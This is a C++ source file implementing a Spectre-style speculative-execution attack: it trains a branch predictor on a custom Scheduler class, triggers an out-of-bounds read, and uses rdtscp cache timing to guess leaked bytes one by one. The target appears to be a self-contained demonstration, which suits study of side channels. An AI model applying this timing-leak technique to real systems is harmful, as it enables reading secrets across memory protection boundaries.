
#include <string>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <x86intrin.h>
#include "scheduler.hpp"
#include "globals.hpp"
#include<ctime>
#include <random>
#include <algorithm>
#include <iterator>
#include <iostream>
#include <vector>
static const size_t BYTES_TO_LEAK = 4;
static const size_t MIN_CHAR = 33;//Space
static const size_t MAX_CHAR = 127;// DEL
static const size_t N_TRAINING = 30;
static const size_t N_AVERAGE = 50;
static const uint64_t BAD_TIME = 5000;
static const size_t CONFUSION_NUMBER = 100;




void confusion(  Scheduler* s)
{
    for( size_t k =0 ; k < CONFUSION_NUMBER; k++ )
    {

        size_t index;
        index = rand( ) % N_STARS; 
        s->ExecuteStar( index );    

    }

}
uint64_t single_attack( Scheduler* s, size_t nOutOfBounds , char guess )
{
    // Flush
    s->ClearSequence();
    // Train the branch predictor
    for( size_t k=0; k< N_TRAINING;k++)
    {

        // Generate a random in bound index 
        uint32_t valid_index;
        valid_index = rand();// no worky?
        //valid_index +=((k * 167) + (  (uint8_t)(guess) * 12) + 13);
        valid_index = valid_index % SEQUENCE_SIZE;
        //printf("%d\n",valid_index);
        // and test it
        s->ExecuteStarInSequence( valid_index );
        
    }
    // Do an out of bounds read
    size_t targetByteIdx;
    targetByteIdx = SEQUENCE_SIZE + nOutOfBounds;
    try
    {
        s->ExecuteStarInSequence( targetByteIdx );
    }
    catch(...)
    {

    }
    
    // Measure access time
    uint64_t start, elapsed;
    uint32_t junk = 0;
    start = __rdtscp( &junk );
    s->ExecuteStar( guess );    
    //_mm_mfence();

    elapsed = __rdtscp( &junk ) - start;

    return elapsed;
}
uint64_t avg_attack(Scheduler* s, size_t nOutOfBounds,  char guess, size_t trials )
{
    uint64_t cumulative = 0;
    for( size_t trial =0 ; trial < trials; trial++ )
    {
        uint64_t counts;
        bool retry(true);
        while( true == retry )
        {

            counts = single_attack( s, nOutOfBounds, guess);

            if( counts > BAD_TIME )
            {
                //printf("Bad counts %d -- retrying \n", counts);
            }
            else
            {
                retry = false;
            }
        }
        
        cumulative += counts;
    }
    return cumulative;
}

int main( void )
{
    srand( time(0));

    Scheduler s;


    std::vector<uint8_t> charNumbers;
    for( size_t k = 0; k < MAX_CHAR-MIN_CHAR ; k++)
    {
        charNumbers.push_back( k );
    }


    for( size_t byteNumber = 0 ; byteNumber < BYTES_TO_LEAK ; byteNumber++ )
    {
        printf("Leaking byte %d\n", byteNumber);
        for(  size_t charNumber : charNumbers )
        //for( uint8_t charNumber=0; charNumber < MAX_CHAR-MIN_CHAR ; charNumber++ )
        {
            
            char guess ;
            uint8_t actual_char = MIN_CHAR + charNumber;
            guess = *reinterpret_cast<char*>( &actual_char);
            printf("Attempting char %c ...", guess);
            uint64_t count;
            
            count = avg_attack( &s, byteNumber , guess, N_AVERAGE);
            printf(" %d\n", count);
        }
    }
    // create a file
    return 0;
}
